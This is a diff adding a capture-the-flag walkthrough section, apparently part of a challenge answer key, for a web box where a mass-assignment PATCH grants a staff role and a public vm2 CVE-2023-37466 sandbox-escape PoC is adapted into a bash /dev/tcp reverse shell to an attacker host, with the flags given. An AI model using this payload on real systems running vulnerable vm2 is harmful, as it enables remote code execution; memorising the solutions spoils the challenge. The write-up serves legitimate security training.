@@ -754,3 +754,105 @@ there is nothing for a player to permanently modify.
    password — the flag is embedded directly in that note.
 
    **Flag:** `CTF{Alw4y5_cHeK_TH2_D2FaulT_P4ss}`
+
+---
+
+## 17. ReactoShell — Mass Assignment Privesc + Real vm2 CVE-2023-37466 RCE — flag18
+
+Two independent bugs, in order — there is no shortcut past either one.
+
+### Stage 1 — recon and account creation
+
+1. Visit `http://<TARGET_IP>:3001/` — "Aramoon", a small IT-institute
+   platform: marketing pages (`/programs`, `/ecosystem`, `/services`,
+   `/institution`) plus a real student login/dashboard. Nothing here
+   hints at a vulnerability directly — there is no exposed debug route,
+   no `robots.txt` giveaway. The way in is the application's own
+   registration flow.
+2. Register a normal account and log in:
+   ```bash
+   curl -c cookies.txt -X POST http://<TARGET_IP>:3001/api/register \
+     --data-urlencode "username=Player" \
+     --data-urlencode "email=player@example.com" \
+     --data-urlencode "password=hunter22"
+   ```
+3. `/dashboard` shows a profile card (role: `student`) and nothing
+   staff-related. Visiting `/staff/tools/reactoshell` directly at this
+   point returns `403 Forbidden` — the tool is genuinely gated, not
+   just unlinked.
+
+### Stage 2 — mass assignment privilege escalation
+
+1. `/profile` has an edit form (display name, bio, GitHub). Its "Save"
+   button calls `PATCH /api/profile` with a small JSON body. Inspecting
+   that request (browser DevTools / Burp) shows nothing unusual by
+   itself — the interesting part is what the *server* does with it.
+2. The handler does `Object.assign(req.user, req.body)` — it merges the
+   entire request body into the stored account record with no field
+   allowlist. Since `role` is just another property on that same
+   record, send it directly:
+   ```bash
+   curl -b cookies.txt -X PATCH http://<TARGET_IP>:3001/api/profile \
+     -H 'Content-Type: application/json' \
+     --data '{"role":"staff"}'
+   ```
+3. `/dashboard` now shows a "Staff Tools" card linking to
+   `/staff/tools/reactoshell`, and the route (page and render API) now
+   returns `200` for this session instead of `403`.
+
+### Stage 3 — real vm2 sandbox escape (CVE-2023-37466)
+
+1. `/staff/tools/reactoshell` is a "component preview" tool: paste a
+   snippet ending in a value (e.g. `React.createElement('div', null,
+   'hi')`) and it's rendered server-side via `POST
+   /staff/tools/reactoshell/api/render`. The banner states the sandbox
+   runtime is `vm2` — no version number shown on the page itself.
+2. `vm2` is a real, widely-used "secure" JS sandboxing library with a
+   history of disclosed sandbox-escape CVEs. This deployment pins
+   `vm2@3.9.19` — the *last* version before the fix landed in `3.10.0`,
+   genuinely vulnerable to **CVE-2023-37466** (CVSS 9.8): a
+   `Promise[Symbol.species]` handler-sanitization bypass, publicly
+   disclosed by Xion (SeungHyun Lee, KAIST Hacking Lab). Fingerprinting
+   the exact patched version and finding the public advisory/PoC is the
+   actual work here — there's no filter or blacklist standing in the
+   way once you have it.
+3. Public PoC (verified working verbatim against this box —
+   https://gist.github.com/leesh3288/f693061e6523c97274ad5298eb2c74e9),
+   adapted to pop a reverse shell instead of `touch pwned`. Start a
+   listener first:
+   ```bash
+   nc -lvnp 4444
+   ```
+   Then submit this as the `code` field of
+   `POST /staff/tools/reactoshell/api/render` (with the staff-role
+   session cookie from Stage 2):
+   ```bash
+   curl -b cookies.txt http://<TARGET_IP>:3001/staff/tools/reactoshell/api/render \
+     -H 'Content-Type: application/json' \
+     --data-binary @- <<'EOF'
+   {"code": "async function fn() {\n    (function stack() { new Error().stack; stack(); })();\n}\np = fn();\np.constructor = {\n    [Symbol.species]: class FakePromise {\n        constructor(executor) {\n            executor(\n                (x) => x,\n                (err) => { return err.constructor.constructor('return process')().mainModule.require('child_process').execSync('bash -c \"bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1\"'); }\n            )\n        }\n    }\n};\np.then();\nReact.createElement('div', null, 'ok');"}
+   EOF
+   ```
+   How it works: an intentionally infinite recursive call inside an
+   `async` function overflows the stack, producing a `RangeError`
+   *outside* the sandbox's normal error path; replacing the pending
+   promise's `constructor` with a fake class that reads
+   `[Symbol.species]` lets the attacker's own executor intercept that
+   raw error object when the promise rejects. That error object's
+   `.constructor` chain leaks the **host** realm's real `Function`
+   constructor — `err.constructor.constructor('return process')()`
+   returns the genuine Node `process` object, breaking the vm2
+   boundary entirely. From there it's ordinary `child_process.execSync`.
+4. The `nc` listener catches an interactive shell as the `reactoapp`
+   user inside the container:
+   ```bash
+   cat /opt/aramoon/flag_reactoshell.txt
+   ```
+
+   **Flag:** `CTF{Re4cT_T0_5hE11_EXp10t4T10n_5uCc2ss}`
+
+   (`/opt/aramoon/README_INTERNAL.txt` in the same directory is a
+   post-exploitation confirmation note that names CVE-2023-37466
+   directly — only readable after RCE, so it's not a pre-solve spoiler;
+   `/opt/aramoon/notes.txt` is an unrelated decoy, a Nabil/JWT-secret
+   easter egg cross-referencing challenge 16's `jwt-weak-secret`.)
